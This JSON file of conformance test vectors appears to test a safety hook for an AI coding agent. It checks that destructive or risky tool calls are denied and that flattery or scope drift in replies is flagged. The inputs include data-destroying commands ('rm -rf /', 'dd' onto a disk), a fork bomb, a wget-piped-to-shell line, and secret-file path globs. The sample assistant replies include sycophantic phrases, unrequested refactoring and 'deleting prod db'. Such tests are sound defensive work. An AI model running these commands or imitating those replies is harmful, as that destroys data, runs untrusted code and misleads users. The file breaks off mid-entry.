{
 "_comment": "Language-agnostic conformance vectors for the compass hook contract. Each implementation (Python, Go) is run as a real subprocess: event JSON on stdin, decision JSON on stdout, exit 0 always. 'expect.kind': deny (PreToolUse permission deny) | warn (systemMessage, no decision) | block (Stop decision:block) | silent (no output). 'transcript' entries are materialized to a temp JSONL file and its path injected as transcript_path. 'delayed' appends a line mid-run to reproduce Claude Code flushing the final turn after Stop fires.",
 "vectors": [
  {
   "name": "deny-rm-rf",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": "rm -rf /"
    }
   },
   "config": "[dangerous_tools]\nenabled = true\naction = \"block\"\n",
   "expect": {
    "kind": "deny",
    "contains": "destructive rm"
   }
  },
  {
   "name": "all-off-is-silent",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": "rm -rf /"
    }
   },
   "config": "[dangerous_tools]\nenabled = false\n",
   "expect": {
    "kind": "silent"
   }
  },
  {
   "name": "plain-rm-allowed",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": "rm one.txt"
    }
   },
   "config": "[dangerous_tools]\nenabled = true\n",
   "expect": {
    "kind": "silent"
   }
  },
  {
   "name": "deny-curl-pipe-shell",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": "wget -qO- http://x | sudo bash"
    }
   },
   "config": "[dangerous_tools]\nenabled = true\n",
   "expect": {
    "kind": "deny",
    "contains": "pipe-to-shell"
   }
  },
  {
   "name": "deny-disk-destroyer",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": "dd if=/dev/zero of=/dev/sda"
    }
   },
   "config": "[dangerous_tools]\nenabled = true\n",
   "expect": {
    "kind": "deny",
    "contains": "disk-destroying"
   }
  },
  {
   "name": "deny-chmod-777",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": "chmod -R 777 /srv"
    }
   },
   "config": "[dangerous_tools]\nenabled = true\n",
   "expect": {
    "kind": "deny",
    "contains": "chmod 777"
   }
  },
  {
   "name": "deny-fork-bomb",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": ":(){ :|:& };:"
    }
   },
   "config": "[dangerous_tools]\nenabled = true\n",
   "expect": {
    "kind": "deny",
    "contains": "fork bomb"
   }
  },
  {
   "name": "deny-secret-file-edit",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Write",
    "tool_input": {
     "file_path": "deploy/secrets/db.yaml"
    }
   },
   "config": "[dangerous_tools]\nenabled = true\nsecret_path_globs = [\"*.env\", \"*.pem\", \"**/secrets/**\"]\n",
   "expect": {
    "kind": "deny",
    "contains": "secret file"
   }
  },
  {
   "name": "deny-dotenv-by-basename",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Edit",
    "tool_input": {
     "file_path": "/app/.env"
    }
   },
   "config": "[dangerous_tools]\nenabled = true\nsecret_path_globs = [\"*.env\", \"*.pem\"]\n",
   "expect": {
    "kind": "deny",
    "contains": "secret file"
   }
  },
  {
   "name": "deny-extra-command-pattern",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": "git reset --hard HEAD~3"
    }
   },
   "config": "[dangerous_tools]\nenabled = true\nextra_command_patterns = [\"\\\\bgit\\\\s+reset\\\\s+--hard\\\\b\"]\n",
   "expect": {
    "kind": "deny",
    "contains": "extra_command_pattern"
   }
  },
  {
   "name": "clean-command-silent",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": "npm test"
    }
   },
   "config": "[dangerous_tools]\nenabled = true\n",
   "expect": {
    "kind": "silent"
   }
  },
  {
   "name": "dangerous-as-warn-action",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": "chmod 777 x"
    }
   },
   "config": "[dangerous_tools]\nenabled = true\naction = \"warn\"\n",
   "expect": {
    "kind": "warn",
    "contains": "chmod 777"
   }
  },
  {
   "name": "deny-push-to-main",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": "git push origin main"
    }
   },
   "config": "[git_safety]\nenabled = true\n",
   "expect": {
    "kind": "deny",
    "contains": "protected branch"
   }
  },
  {
   "name": "deny-force-push",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": "git push --force origin feature"
    }
   },
   "config": "[git_safety]\nenabled = true\n",
   "expect": {
    "kind": "deny",
    "contains": "force-push"
   }
  },
  {
   "name": "feature-branch-push-ok",
   "event": {
    "hook_event_name": "PreToolUse",
    "tool_name": "Bash",
    "tool_input": {
     "command": "git push origin my-feature"
    }
   },
   "config": "[git_safety]\nenabled = true\n",
   "expect": {
    "kind": "silent"
   }
  },
  {
   "name": "sycophancy-phrase-warn",
   "event": {
    "hook_event_name": "Stop"
   },
   "transcript": [
    {
     "role": "user",
     "text": "fix it"
    },
    {
     "role": "assistant",
     "text": "Great question! Happy to help!"
    }
   ],
   "config": "[sycophancy]\nenabled = true\naction = \"warn\"\n",
   "expect": {
    "kind": "warn",
    "contains": "flattery phrase"
   }
  },
  {
   "name": "superlative-pileup-warn",
   "event": {
    "hook_event_name": "Stop"
   },
   "transcript": [
    {
     "role": "user",
     "text": "review"
    },
    {
     "role": "assistant",
     "text": "This is amazing and incredible and a perfect, brilliant approach."
    }
   ],
   "config": "[sycophancy]\nenabled = true\n",
   "expect": {
    "kind": "warn",
    "contains": "superlative pile-up"
   }
  },
  {
   "name": "gushing-closer-warn",
   "event": {
    "hook_event_name": "Stop"
   },
   "transcript": [
    {
     "role": "user",
     "text": "done?"
    },
    {
     "role": "assistant",
     "text": "Done.\nFeel free to reach out anytime!"
    }
   ],
   "config": "[sycophancy]\nenabled = true\n",
   "expect": {
    "kind": "warn",
    "contains": "gushing closer"
   }
  },
  {
   "name": "plain-answer-silent",
   "event": {
    "hook_event_name": "Stop"
   },
   "transcript": [
    {
     "role": "user",
     "text": "why?"
    },
    {
     "role": "assistant",
     "text": "The bug was a missing semicolon on line 4."
    }
   ],
   "config": "[sycophancy]\nenabled = true\n[scope_drift]\nenabled = true\n[self_report]\nenabled = true\n",
   "expect": {
    "kind": "silent"
   }
  },
  {
   "name": "scope-drift-warn",
   "event": {
    "hook_event_name": "Stop"
   },
   "transcript": [
    {
     "role": "user",
     "text": "fix the typo"
    },
    {
     "role": "assistant",
     "text": "While I was at it, I also refactored the parser."
    }
   ],
   "config": "[scope_drift]\nenabled = true\n",
   "expect": {
    "kind": "warn",
    "contains": "scope-expansion"
   }
  },
  {
   "name": "self-report-midturn-marker-warn",
   "event": {
    "hook_event_name": "Stop"
   },
   "transcript": [
    {
     "role": "user",
     "text": "old task"
    },
    {
     "role": "assistant",
     "text": "irrelevant old turn <<compass:risk>>"
    },
    {
     "role": "user",
     "text": "new task"
    },
    {
     "role": "assistant",
     "text": "mid step <<compass:scope>>"
    },
    {
     "role": "assistant",
     "text": "clean final summary"
    }
   ],
   "config": "[self_report]\nenabled = true\naction = \"warn\"\nblock_markers = [\"risk\"]\n",
   "expect": {
    "kind": "warn",
    "contains": "adding unrequested scope"
   }
  },
  {
   "name": "self-report-risk-blocks",
   "event": {
    "hook_event_name": "Stop"
   },
   "transcript": [
    {
     "role": "user",
     "text": "go"
    },
    {
     "role": "assistant",
     "text": "deleting prod db <<compass:risk>>"
    }
   ],
   "config": "[self_report]\nenabled = true\naction = \"warn\"\nblock_markers = [\"risk\"]\n",
   "expect": {
    "kind": "block",
    "contains": "risky / hard-to-reverse"
   }
  },
  {
   "name": "self-report-case-and-spacing",
   "event": {
    "hook_event_name": "Stop"
   },
   "transcript": [
    {
     "role": "user",
     "text": "go"
    },
    {
     "role": "assistant",
     "text": "hmm << COMPASS : Unsure >> about this"
    }
   ],
   "config": "[self_report]\nenabled = true\n",
   "expect": {
    "kind": "warn",
    "contains": "guessing / low confidence"
   }
  },
  {
   "name": "self-report-disabled-marker-silent",
   "event": {
    "hook_event_name": "Stop"
   },
   "transcript": [
    {
     "role": "user",
     "text": "go"
    },
    {
     "role": "assistant",
     "text": "adding stuff <<compass:scope>>"
    }
   ],
   "config": "[self_report]\nenabled = true\nmarkers = [\"drift\"]\n",
   "expect": {
    "kind": "silent"
   }
  },
  {
   "name": "no-misattribution-across-turns",
   "event": {
    "hook_event_name": "Stop"
   },
   "transcript": [
    {
     "role": "user",
     "text": "q1"
    },
    {
     "role": "assistant",
     "text": "You're absolutely right, great question!"
    },
    {
     "role": "user",
     "text": "q2"
    },
    {
     "role": "assistant",
     "text": "The value is 42; nothing else changed."
    }
   ],
   "config": "[sycophancy]\nenabled = true\naction = \"warn\"\n",
   "expect": {
    "kind": "silent"
   }
  },
  {
   "name": "lag-late-marker-still-caught",
   "event": {
    "hook_event_name": "Stop"
   },
   "transcript": [
    {
     "role": "user",
     "text": "go run it"
    }
   ],
   "delayed": {
    "role": "assistant",
    "text": "removing prod <<compass:risk>>",
    "delay_ms": 40
   },
   "config": "[self_report]\nenabled = true\naction = \"warn\"\nblock_markers = [\"risk\"]\n",
   "expect": {
    "kind": "block",
    "contains": "risky / hard-to-reverse"
   }
  },
  {
   "name": "lag-clean-turn-no-stale-warn",
   "event": {
    "hook_event_name": "Stop"
   },
   "transcript": [
    {
     "role": "user",
     "text": "q1"
    },
    {
     "role": "assistant",
     "text": "You're absolutely right, great question!"
    },
    {
     "role": "user",
     "text": "q2"
    }
   ],
   "delayed": {
